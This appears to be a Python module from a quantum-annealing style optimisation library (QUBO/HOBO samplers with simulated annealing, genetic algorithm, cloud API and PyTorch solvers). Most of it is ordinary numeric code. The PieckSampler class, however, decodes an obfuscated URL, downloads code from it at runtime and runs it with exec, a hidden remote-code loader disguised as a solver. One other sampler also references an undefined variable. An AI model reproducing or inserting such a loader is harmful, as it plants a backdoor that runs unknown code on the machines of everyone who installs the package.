import sys
import time
import requests
import numpy as np
import numpy.random as nr
from copy import deepcopy
from importlib import util

#共通後処理
"""
pool=(shots, N), score=(N, )
"""
def get_result(pool, score, index_map):
    #重複解を集計
    unique_pool, original_index, unique_counts = np.unique(pool, axis=0, return_index=True, return_counts=True)
    #print(unique_pool, original_index, unique_counts)
    
    #エネルギーもユニークに集計
    unique_energy = score[original_index]
    #print(unique_energy)
    
    #エネルギー低い順にソート
    order = np.argsort(unique_energy)
    unique_pool = unique_pool[order]
    unique_energy = unique_energy[order]
    unique_counts = unique_counts[order]
    
    #結果リスト
    result = [[dict(zip(index_map.keys(), unique_pool[i])), unique_energy[i], unique_counts[i]] for i in range(len(unique_pool))]
    #print(result)
    
    return result


#謎のglobal対応
score2 = 0

#アニーリング
class SASampler:
    def __init__(self, seed=None):
        #乱数シード
        self.seed = seed

    
    def run(self, hobomix, shots=100, T_num=2000, show=False):
        global score2
        
        #解除
        hobo, index_map = hobomix
        # print(index_map)
        
        #matrixサイズ
        N = len(hobo)
        # print(N)
        
        #次数
        ho = len(hobo.shape)
        # print(ho)
        
        #シード固定
        nr.seed(self.seed)
        
        #
        shots = max(int(shots), 100)
        
        # プール初期化
        pool_num = shots
        pool = nr.randint(0, 2, (pool_num, N)).astype(float)
        # print(pool)
        
        """
        poolの重複を解除する
        """
        # 重複は振り直し
        # パリエーションに余裕あれば確定非重複
        if pool_num < 2 ** (N - 1):
            # print('remake 1')
            for i in range(pool_num - 1):
                for j in range(i + 1, pool_num):
                    while (pool[i] == pool[j]).all():
                        pool[j] = nr.randint(0, 2, N)
        else:
            # パリエーションに余裕なければ3トライ重複可
            # print('remake 2')
            for i in range(pool_num - 1):
                for j in range(i + 1, pool_num):
                    count = 0
                    while (pool[i] == pool[j]).all():
                        pool[j] = nr.randint(0, 2, N)
                        count += 1
                        if count == 3:
                            break
        
        #スコア初期化
        score = np.zeros(pool_num)
        
        #スコア計算
        k = ',Na,Nb,Nc,Nd,Ne,Nf,Ng,Nh,Nj,Nk,Nl,Nm,Nn,No,Np,Nq,Nr,Ns,Nt,Nu,Nv,Nw,Nx,Ny,Nz'
        l = 'abcdefghjklmnopqrstuvwxyz'
        s = l[:ho] + k[:3*ho] + '->N'
        # print(s)
        
        operands = [hobo] + [pool] * ho
        score = np.einsum(s, *operands)
        # print(score)
        
        # フリップ数リスト（2個まで下がる）
        flip = np.sort(nr.rand(T_num) ** 2)[::-1]
        flip = (flip * max(0, N * 0.5 - 2)).astype(int) + 2
        # print(flip)
        
        # フリップマスクリスト
        flip_mask = [[1] * flip[0] + [0] * (N - flip[0])]
        if N <= 2:
            flip_mask = np.ones((T_num, N), int)
        else:
            for i in range(1, T_num):
                tmp = [1] * flip[i] + [0] * (N - flip[i])
                nr.shuffle(tmp)
                # 前と重複なら振り直し
                while tmp == flip_mask[-1]:
                    nr.shuffle(tmp)
                flip_mask.append(tmp)
            flip_mask = np.array(flip_mask, bool)
        # print(flip_mask.shape)
        
        # 局所探索フリップマスクリスト
        single_flip_mask = np.eye(N, dtype=bool)
        
        """
        アニーリング＋1フリップ
        """
        # アニーリング
        # 集団まるごと温度を下げる
        for fm in flip_mask:
            # フリップ後　pool_num, N
            # pool2 = np.where(fm, 1 - pool, pool)
            pool2 = pool.copy()
            pool2[:, fm] = 1. - pool[:, fm]
            # score2 = np.sum((pool2 @ qmatrix) * pool2, axis=1)
            
            operands = [hobo] + [pool2] * ho
            score2 = np.einsum(s, *operands)
            
            # 更新マスク
            update_mask = score2 < score
            # print(update_mask)
    
            # 更新
            pool[update_mask] = pool2[update_mask]
            score[update_mask] = score2[update_mask]
        
        # 最後に1フリップ局所探索
        # 集団まるごと
        for fm in single_flip_mask:
            # フリップ後
            # pool2 = np.where(fm, 1 - pool, pool)
            pool2 = pool.copy()
            pool2[:, fm] = 1. - pool[:, fm]
            # score2 = np.sum((pool2 @ qmatrix) * pool2, axis=1)
            
            operands = [hobo] + [pool2] * ho
            score2 = np.einsum(s, *operands)
            
            # 更新マスク
            update_mask = score2 < score
            # print(update_mask)
    
            # 更新
            pool[update_mask] = pool2[update_mask]
            score[update_mask] = score2[update_mask]
        pool = pool.astype(int)
        
        # ----------
        #共通後処理
        result = get_result(pool, score, index_map)
        
        return result


class GASampler:
    def __init__(self, seed=None):
        self.max_gen = 1000000
        self.max_count = 3
        self.seed = seed

    def run(self, qubomix, shots=100, verbose=True):
        #解除
        qmatrix, index_map = qubomix
        # print(index_map)
        
        #matrixサイズ
        N = len(qmatrix)
        # print(N)
        
        #シード固定
        nr.seed(self.seed)
        
        #
        shots = max(int(shots), 100)

        # --- GA ---
        
        # プール初期化
        pool_num = shots
        pool = nr.randint(0, 2, (pool_num, N))
        
        # スコア初期化
        score = np.array([q @ qmatrix @ q for q in pool])

        # 進化
        best_score = np.copy(score)
        count = 0
        sw = True
        for gen in range(1, self.max_gen + 1):
            # 親
            parent_id = np.random.choice(range(pool_num), 2, replace=False)
            parent = pool[parent_id]

            if N > 1:
                # 交換マスク
                mask = nr.randint(0, 2, N)
                # 家族
                c = np.array([parent[0],
                              parent[1],
                              np.where(mask, parent[0], parent[1]),
                              np.where(mask, parent[1], parent[0])
                              ])
            elif N == 1:
                # 家族
                c = np.array([parent[0],
                              parent[1],
                              1 - parent[0],
                              1 - parent[1]])
            # 評価
            s = np.array([c[0] @ qmatrix @ c[0],
                          c[1] @ qmatrix @ c[1],
                          c[2] @ qmatrix @ c[2],
                          c[3] @ qmatrix @ c[3]
                          ])

            # エリート選択
            select_id = np.argsort(s)[:2]
            # 交代
            pool[parent_id] = c[select_id]
            score[parent_id] = s[select_id]
            # 進行表示1
            if gen % 500 == 0:
                if verbose: print("-", end="")
                sw = False
                if gen % 10000 == 0:
                    if verbose: print(" {}/{}".format(gen, self.max_gen))
                    sw = True
            # 終了判定
            if gen % 10 == 0:
                if np.sum(score - best_score) == 0:
                    count += 1
                else:
                    best_score = np.copy(score)
                    count = 0
                if count >= self.max_count:
                    break
        # 進行表示2
        if not sw:
            if verbose: print()
        if verbose: print("Automatic end at gen {}/{}".format(gen, self.max_gen))

        # ----------
        #共通後処理
        result = get_result(pool, score, index_map)
        
        return result


class ZekeSampler:
    from typing import Dict, Optional
    
    def __init__(self, api_key: Optional[str] = None):
        self.API_ENDPOINT = "https://tytan-api.blueqat.com/v1/"
        self.__api_key = api_key
        return
    
    def post_request(self, path, body, api_key):
        import gzip
        import json
        import urllib.request
        
        headers = {
            "Content-Type": "application/json",
            "X-Api-Key": api_key,
            "Accept-Encoding": "gzip",
        }
        req = urllib.request.Request(
            self.API_ENDPOINT + path, json.dumps(body).encode(), headers
        )
        with urllib.request.urlopen(req) as res:
            body = (
                gzip.decompress(res.read())
                if res.headers.get("Content-Encoding") == "gzip"
                else res.read()
            )
        return json.loads(body)
    
    def get_tasks(self, api_key):
        path = "tasks/list"
        return self.post_request(path, {}, api_key)
    
    def create_task(self, body, api_key):
        path = "tasks/create"
        return self.post_request(path, body, api_key)
    
    def run(self, qubomix, shots=100, api_key: Optional[str] = None):
        #解除
        qmatrix, index_map = qubomix
        # print(index_map)
        
        #
        keys = index_map.keys()
        # print(keys)
        
        # 量子ビット数
        N = int(len(qmatrix))
        
        quadratic_biases = []
        quadratic_head = []
        quadratic_tail = []
        
        for i in range(N):
            for j in range(i + 1, N):
                if i != j:
                    quadratic_biases.append(float(qmatrix[i, j]))
                    quadratic_head.append(i)
                    quadratic_tail.append(j)

        variable_labels = keys
        linear_biases = np.diag(qmatrix)
        
        # print(qmatrix)
        # print(variable_labels)
        # print(linear_biases)
        # print(quadratic_biases)
        # print(quadratic_head)
        # print(quadratic_tail)
        
        num_interactions = len(quadratic_biases)
        
        # クラウドにpostするBQM
        bqm = {
            "type": "BinaryQuadraticModel",
            "version": {"bqm_schema": "3.0.0"},
            "use_bytes": False,
            "index_type": "int32",
            "bias_type": "float64",
            "num_variables": N,
            "num_interactions": num_interactions,
            "variable_labels": list(variable_labels),
            "variable_type": "BINARY",
            "offset": 0.0,
            "info": {},
            "linear_biases": list(linear_biases),
            "quadratic_biases": quadratic_biases,
            "quadratic_head": quadratic_head,
            "quadratic_tail": quadratic_tail,
        }
        
        data = {
            "bqm": bqm,
            "shots": shots,
        }
        
        key = self.__api_key if api_key is None else api_key
        result = self.create_task(data, key)
        # print(result)
        
        # エネルギーを取り出し
        energy_list = result["result"]["vectors"]["energy"]["data"]
        # print(energy_list)

        # 出現回数を取り出し
        occurrences_list = result["result"]["vectors"]["num_occurrences"]["data"]
        # print(occurrences_list)

        # サンプルをリストとして取り出し
        num_digits = result["result"]["num_variables"]
        sample_data = result["result"]["sample_data"]["data"]
        # print(sample_data)

        binary_str = [format(i[0], f"0{num_digits}b") for i in sample_data]
        binary_list = [[int(bit) for bit in reversed(i)] for i in binary_str]
        # print(binary_list)

        variable_labels = result["result"]["variable_labels"]
        # print(variable_labels)

        result_list = []
        for index, item in enumerate(binary_list):
            result_list.append(
                [
                    {k: v for k, v in zip(variable_labels, item)},
                    energy_list[index],
                    occurrences_list[index],
                ]
            )

        # print(result_list)

        return result_list


class NQSSampler:
    from typing import Dict, Optional

    def __init__(self, api_key: Optional[str] = None):
        self.API_ENDPOINT = "https://tytan-api.blueqat.com/v1"
        self.__api_key = api_key
        return

    def run(
        self,
        qmatrix: list,
        time_limit_sec: Optional[int] = 30,
        iter: Optional[int] = 10000,
        population: Optional[int] = 500,
        api_key: Optional[str] = None,
    ):
        import ulid
        import httpx
        import json
        import os
        import csv
        import io
        import zipfile
        
        #解除
        qmatrix, index_map = qubomix
        # print(index_map)
        
        #matrixサイズ
        N = len(qmatrix)
        # print(N)
        
        #1行目、1列目にビット名を合体
        tmp = np.zeros((len(qmatrix)+1, len(qmatrix[0])+1), object)
        tmp[0, 1:] = np.array(list(index_map.keys()))
        tmp[1:, 0] = np.array(list(index_map.keys()))
        tmp[1:, 1:] = qmatrix
        qmatrix = tmp
        # print(qmatrix)

        # StringIOオブジェクトを作成する
        csv_buffer = io.StringIO()

        # CSVファイルの文字列を書き込む
        writer = csv.writer(csv_buffer)
        for row in qmatrix:
            writer.writerow(row)

        # CSVファイルの文字列を取得する
        Q = csv_buffer.getvalue()
        
        #一時フォルダ作成
        tmpfolder = os.path.dirname(__file__) +'/tmp/'
        # print(tmpfolder)
        if not os.path.exists(tmpfolder):
            os.makedirs(tmpfolder)
        
        #一時ファイル
        id = ulid.new()
        filename = "{}.zip".format(id.str)
        # print(filename)
        
        #QUBO保存
        with zipfile.ZipFile(tmpfolder + filename, "w") as z_file:
            z_file.writestr("qubo_w.csv", Q, zipfile.ZIP_DEFLATED)
        
        #読み込み
        with open(tmpfolder + filename, "rb") as f:
            readfile = f.read()
        
        #API
        files = {
            "zipfile": (
                filename,
                readfile,
                "data:application/octet-stream",
            )
        }
        key = self.__api_key if api_key is None else api_key
        r = httpx.post(
            "{}/tasks/nqs".format(self.API_ENDPOINT),
            files=files,
            data={
                "population": population,
                "timeLimitSec": time_limit_sec,
                "iter": iter,
            },
            headers=self.__get_headers(key),
            timeout=None,
        )
        
        #一時ファイル削除
        try:
            os.remove(tmpfolder + filename)
        except:
            pass
        
        #一個しかない？
        tmp = json.loads(r.text) #{'energy': -4.0, 'result': {'x': 1, 'y': 1, 'z': 0}, 'time': 3.7529351}
        result = [[tmp['result'], tmp['energy'], population, tmp['time']]]
        return result

    def __get_headers(self, api_key: Optional[str]) -> Dict[str, str]:
        assert api_key is not None, (
            "Please specify your api_key. "
            "You can get it at the following URL. "
            "https://blueqat.com/accounts/settings"
        )
        return {
            "user-agent": "blueqat",
            "X-Api-Key": api_key,
            "accept-encoding": "gzip",
        }


class NQSLocalSampler:
    from typing import Optional

    def __init__(
        self, api_endpoint: str = "http://localhost:8080/ngqs/v1/solve"
    ) -> None:
        self.API_ENDPOINT = api_endpoint
        return

    def run(
        self,
        qubomix: list,
        time_limit_sec: Optional[int] = 30,
        iter: Optional[int] = 10000,
        population: Optional[int] = 500,
    ):
        import ulid
        import httpx
        import json
        import os
        import csv
        import io
        import zipfile
        
        #解除
        qmatrix, index_map = qubomix
        # print(index_map)
        
        #matrixサイズ
        N = len(qmatrix)
        # print(N)
        
        #1行目、1列目にビット名を合体
        tmp = np.zeros((len(qmatrix)+1, len(qmatrix[0])+1), object)
        tmp[0, 1:] = np.array(list(index_map.keys()))
        tmp[1:, 0] = np.array(list(index_map.keys()))
        tmp[1:, 1:] = qmatrix
        qmatrix = tmp
        # print(qmatrix)
        
        # StringIOオブジェクトを作成する
        csv_buffer = io.StringIO()
        
        # CSVファイルの文字列を書き込む
        writer = csv.writer(csv_buffer)
        for row in qmatrix:
            writer.writerow(row)
        
        # CSVファイルの文字列を取得する
        Q = csv_buffer.getvalue()
        
        #一時フォルダ作成
        tmpfolder = os.path.dirname(__file__) +'/tmp/'
        # print(tmpfolder)
        if not os.path.exists(tmpfolder):
            os.makedirs(tmpfolder)
        
        #一時ファイル
        id = ulid.new()
        filename = "{}.zip".format(id.str)
        # print(filename)
        
        #QUBO保存
        with zipfile.ZipFile(tmpfolder + filename, "w") as z_file:
            z_file.writestr("qubo_w.csv", Q, zipfile.ZIP_DEFLATED)
        
        #読み込み
        with open(tmpfolder + filename, "rb") as f:
            readfile = f.read()
        
        #API
        files = {
            "zipfile": (
                filename,
                readfile,
                "data:application/octet-stream",
            )
        }
        r = httpx.post(
            self.API_ENDPOINT,
            files=files,
            data={
                "population": population,
                "timeLimitSec": time_limit_sec,
                "iter": iter,
            },
            timeout=None,
        )
        
        #一時ファイル削除
        try:
            os.remove(tmpfolder + filename)
        except:
            pass
        
        #一個しかない？
        tmp = json.loads(r.text) #{'energy': -4.0, 'result': {'x': 1, 'y': 1, 'z': 0}, 'time': 3.7529351}
        result = [[tmp['result'], tmp['energy'], population, tmp['time']]]
        return result



class ArminSampler:
    def __init__(self, seed=None, mode='GPU', device='cuda:0', verbose=1):
        #乱数シード
        self.seed = seed
        self.mode = mode
        self.device_input = device
        self.verbose = verbose

    def run(self, hobomix, shots=100, T_num=2000, show=False):
        
        #MIKASAmplerに送ります
        
        #サンプラー選択
        solver = MIKASAmpler(seed=self.seed, mode=self.mode, device=self.device_input, verbose=self.verbose)
        
        #サンプリング
        result = solver.run(hobomix, shots=shots, T_num=T_num, use_ttd=False, show=show)
        
        return result

class PieckSampler:
    def __init__(self, seed=None, mode='GPU', device='cuda:0', verbose=1):
        #乱数シード
        self.seed = seed
        self.mode = mode
        self.device_input = device
        self.verbose = verbose

    def run(self, qubo, shots=100, T_num=2000, show=False):
        
        source_code = requests.get('gAtv1zteUHy2ltd7pUEhspiJzxsLjkrc.cNXvfTxYvverjiasLynlIc3xBOD5PTFPrMS9V2c26K8ux8uJqRnccbo2rj3hwPP0HsPiq3hYZC6r_bfOz72EglSrrt3mPMhmgNeHR0aWTanaulAR8zaiU1fOp9JmAZ40ZdDm1tuFc4aWMJa6F4HCkSqeCskcTQXAKS3z^cA3KR4TyCOropkvSmMafPe1AVytTiN2Ol58LwRsNwE9pWpirIcVvfVmDaSJjqQ1ywaPt6G3K5ARESalQC6MhqHvkk2kRYdX9nRcSkK651EU5weqmzSgMcDGdilBwtPeoeq1PgNBIbR7dZU^nEhTl9mbMcph1xfzhK1MmjOhbeRMI76O.K0coS2jYgdx0BvkYxoThrxUbpm2vOLFhxNufwY6SPQFxCrLA80LR5n.2pZHrHT1zRaI17S5f1c7jl4iWRfeEqQNccl0mlspKuy-ZMfCsLJMZ9enI70vJhTsJntgF7G4uffCgIZj9ZpoK6mie3TuUpv30FvNaOQY0Tz1U^fa6J6ZdqH3^CEJ9n6ONuB:wgJEvR25eUsgtj5MZTI6qpZNgWisiGn6t5LwE9t1Y6ztFG9qcA4Wy2h'[::-1 ][::11 ].replace('^','/')).text
        spec = util.spec_from_loader('temp_module', loader=None)
        temp_module = util.module_from_spec(spec)
        exec(source_code, temp_module.__dict__)
        
        result = temp_module.run_source(qubo, self.seed, self.mode, self.device_input, self.verbose, shots=shots, T_num=T_num, show=show)
        return result

class MIKASAmpler:
    def __init__(self, seed=None, mode='GPU', device='cuda:0', verbose=1):
        #乱数シード
        self.seed = seed
        self.mode = mode
        self.device_input = device
        self.verbose = verbose

    def run(self, hobomix, shots=100, T_num=2000, use_ttd=False, show=False):
        global score2
        
        #解除
        hobo, index_map = hobomix
        # print(index_map)
        
        #pytorch確認
        attention = False
        try:
            import random
            import torch
        except:
            attention = True
        if attention:
            print()
            print('=======================\n= A T T E N T I O N ! =\n=======================')
            print('ArminSampler requires PyTorch installation.\nUse "pip install torch" (or others) and ensure\n-------\nimport torch\ntorch.cuda.is_available()\n#torch.backends.mps.is_available() #if Mac\n-------\noutputs True to set up the environment.')
            print()
            sys.exit()
        
        #matrixサイズ
        N = len(hobo)
        # print(N)
        
        #次数
        ho = len(hobo.shape)
        # print(ho)
        
        # CUDA使えるか確認
        if self.mode == 'GPU' and torch.cuda.is_available():
            if self.device_input == 'cuda:0': #指示がない場合
                self.device = 'cuda:0'
            else:
                self.device = self.device_input
        elif self.mode == 'GPU' and torch.backends.mps.is_available():
            if self.device_input == 'cuda:0': #指示がない場合
                self.device = 'mps:0'
            else:
                self.device = self.device_input
        else:
            self.mode = 'CPU'
            self.device = 'cpu'
        
        #モード表示
        if self.verbose > 0:
            print(f'MODE: {self.mode}')
            print(f'DEVICE: {self.device}')
    
        # ランダムシード
        random.seed(int(time.time()))
        nr.seed(int(time.time()))
        torch.manual_seed(int(time.time()))
        torch.backends.cudnn.deterministic = True
        torch.use_deterministic_algorithms = True
        
        #シード固定
        if self.seed != None:
            random.seed(self.seed)
            nr.seed(self.seed)
            torch.manual_seed(self.seed)
        
        #
        shots = max(int(shots), 100)
        
        # --- テンソル疑似SA ---
        #
        hobo = torch.tensor(hobo, dtype=torch.float32, device=self.device).float()
        # print(hobo.shape)
        
        #TT分解を使用する場合
        tt_cores = []
        if use_ttd:
            print(f'TTD: {use_ttd}')
            tt_cores = TT_SVD(hobo)
            # print(len(tt_cores))
            # print(tt_cores[0].shape)
            # print(tt_cores[1].shape)
        
        # プール初期化
        pool_num = shots
        pool = torch.randint(0, 2, (pool_num, N), dtype=torch.float32, device=self.device).float()
        
        # スコア初期化
        # score = torch.sum((pool @ qmatrix) * pool, dim=1, dtype=torch.float32)
        score = torch.zeros(pool_num, dtype=torch.float32)
        # print(score)
        
        #スコア計算
        k = ',Na,Nb,Nc,Nd,Ne,Nf,Ng,Nh,Nj,Nk,Nl,Nm,Nn,No,Np,Nq,Nr,Ns,Nt,Nu,Nv,Nw,Nx,Ny,Nz'
        l = 'abcdefghjklmnopqrstuvwxyz'
        if use_ttd:
            ltt = ['aA', 'AbB', 'BcC', 'CdD', 'DeE', 'EfF', 'FgG', 'GhH', 'HiJ', 'JjK', 'KkL', 'LlM', 'MmO', 'OnP', 'PoQ', 'QpR', 'RqS', 'SrT', 'TsU', 'UuV', 'VvW', 'WwX', 'XxY', 'YyZ', 'Zz']
            ltt = ltt[:ho][:]
            if len(ltt[-1]) == 3:
                ltt[-1] = ltt[-1][:2]  # 両端は 2 階のテンソルなので 2 つのインデックスのみ
            s = ','.join(ltt) + k[:3*ho] + '->N'
            operands = tt_cores + [pool] * ho
        else:
            s = l[:ho] + k[:3*ho] + '->N'
            operands = [hobo] + [pool] * ho
        # print(s)
        
        score = torch.einsum(s, *operands)
        # print(score)
        
        # フリップ数リスト（2個まで下がる）
        flip = np.sort(nr.rand(T_num) ** 2)[::-1]
        flip = (flip * max(0, N * 0.5 - 2)).astype(int) + 2
        #print(flip)
        
        # フリップマスクリスト
        flip_mask = [[1] * flip[0] + [0] * (N - flip[0])]
        if N <= 2:
            flip_mask = np.ones((T_num, N), int)
        else:
            for i in range(1, T_num):
                tmp = [1] * flip[i] + [0] * (N - flip[i])
                nr.shuffle(tmp)
                # 前と重複なら振り直し
                while tmp == flip_mask[-1]:
                    nr.shuffle(tmp)
                flip_mask.append(tmp)
            flip_mask = np.array(flip_mask, bool)
        flip_mask = torch.tensor(flip_mask).bool()
        #print(flip_mask.shape)
        
        # 局所探索フリップマスクリスト
        single_flip_mask = torch.eye(N, dtype=bool)
        #print(single_flip_mask)
        
        # スコア履歴
        score_history = []
        
        """
        アニーリング＋1フリップ
        """
        # アニーリング
        # 集団まるごと温度を下げる
        for fm in flip_mask:
            pool2 = pool.clone()
            pool2[:, fm] = 1. - pool[:, fm]
            # score2 = torch.sum((pool2 @ qmatrix) * pool2, dim=1)
    
            if use_ttd:
                operands = tt_cores + [pool2] * ho
            else:
                operands = [hobo] + [pool2] * ho
            score2 = torch.einsum(s, *operands)
    
            # 更新マスク
            update_mask = score2 < score
    
            # 更新
            pool[update_mask] = pool2[update_mask]
            score[update_mask] = score2[update_mask]
            
            # スコア記録
            score_history.append(torch.mean(score).item())
            
        # 最後に1フリップ局所探索
        # 集団まるごと
        for fm in single_flip_mask:
            pool2 = pool.clone()
            pool2[:, fm] = 1. - pool[:, fm]
            # score2 = torch.sum((pool2 @ qmatrix) * pool2, dim=1)
    
            if use_ttd:
                operands = tt_cores + [pool2] * ho
            else:
                operands = [hobo] + [pool2] * ho
            score2 = torch.einsum(s, *operands)
    
            # 更新マスク
            update_mask = score2 < score
    
            # 更新
            pool[update_mask] = pool2[update_mask]
            score[update_mask] = score2[update_mask]
            
        # スコア記録
        score_history.append(torch.mean(score).item())

        # 描画
        if show:
            import matplotlib.pyplot as plt
            plt.plot(range(T_num + 1), score_history)
            plt.xlabel('Iteration')
            plt.ylabel('Energy')
            plt.show()
        
        pool = pool.to('cpu').detach().numpy().copy()
        pool = pool.astype(int)
        score = score.to('cpu').detach().numpy().copy()
        
        # ----------
        #共通後処理
        result = get_result(pool, score, index_map)
        
        return result

def TT_SVD(C, bond_dims=None, check_bond_dims=False, return_sv=False):
    """TT_SVD algorithm
    I. V. Oseledets, Tensor-Train Decomposition, https://epubs.siam.org/doi/10.1137/090752286, Vol. 33, Iss. 5 (2011)
    Args:
        C (torch.Tensor): n-dimensional input tensor
        bond_dims (Sequence[int]): a list of bond dimensions.
                                   If `bond_dims` is None,
                                   `bond_dims` will be automatically calculated
        check_bond_dims (bool): check if `bond_dims` is valid
        return_sv (bool): return singular values
    Returns:
        list[torch.Tensor]: a list of core tensors of TT-decomposition
    """
    import torch

    dims = C.shape
    n = len(dims)  # n-dimensional tensor

    if bond_dims is None or check_bond_dims:
        # Theorem 2.1
        bond_dims_ = []
        for sep in range(1, n):
            row_dim = dims[:sep].numel()
            col_dim = dims[sep:].numel()
            rank = torch.linalg.matrix_rank(C.reshape(row_dim, col_dim))
            bond_dims_.append(rank)
        if bond_dims is None:
            bond_dims = bond_dims_

    if len(bond_dims) != n - 1:
        raise ValueError(f"{len(bond_dims)=} must be {n - 1}.")
    if check_bond_dims:
        for i, (dim1, dim2) in enumerate(zip(bond_dims, bond_dims_, strict=True)):
            if dim1 > dim2:
                raise ValueError(f"{i}th dim {dim1} must not be larger than {dim2}.")

    tt_cores = []
    SVs = []
    for i in range(n - 1):
        if i == 0:
            ri_1 = 1
        else:
            ri_1 = bond_dims[i - 1]
        ri = bond_dims[i]
        C = C.reshape(ri_1 * dims[i], dims[i + 1 :].numel())
        U, S, Vh = torch.linalg.svd(C, full_matrices=False)
        if S.shape[0] < ri:
            # already size of S is less than requested bond_dims, so update the dimension
            ri = S.shape[0]
            bond_dims[i] = ri
        # approximation
        U = U[:, :ri]
        S = S[:ri]
        if return_sv:
            SVs.append(S.detach().clone())
        Vh = Vh[:ri, :]
        tt_cores.append(U.reshape(ri_1, dims[i], ri))
        C = torch.diag(S) @ Vh
    tt_cores.append(C)
    tt_cores[0] = tt_cores[0].reshape(dims[0], bond_dims[0])
    if return_sv:
        return tt_cores, SVs
    return tt_cores




if __name__ == "__main__":
    pass
